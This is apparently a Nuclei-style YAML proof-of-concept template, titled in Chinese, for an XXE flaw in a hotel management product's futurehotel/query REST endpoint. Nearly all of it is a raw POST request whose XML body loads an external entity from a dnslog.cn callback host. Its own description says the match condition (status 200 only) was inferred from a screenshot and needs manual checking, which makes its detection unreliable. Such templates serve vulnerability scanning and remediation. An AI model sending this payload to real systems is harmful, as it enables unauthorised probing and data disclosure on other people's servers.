id: poc-ptip3lp2hwm2vn9o
info:
  name: 西软云XMS-futurehotelquery接口存在XXE漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: xxe,2024
http:
- raw:
  - 'POST /XopServerRS/rest/futurehotel/query HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.3157.54 Safari/537.36

    Connection: close

    Content-Type: text/xml

    Accept-Encoding: gzip

    <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://xxx.dnslog.cn"> %remote;]>'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
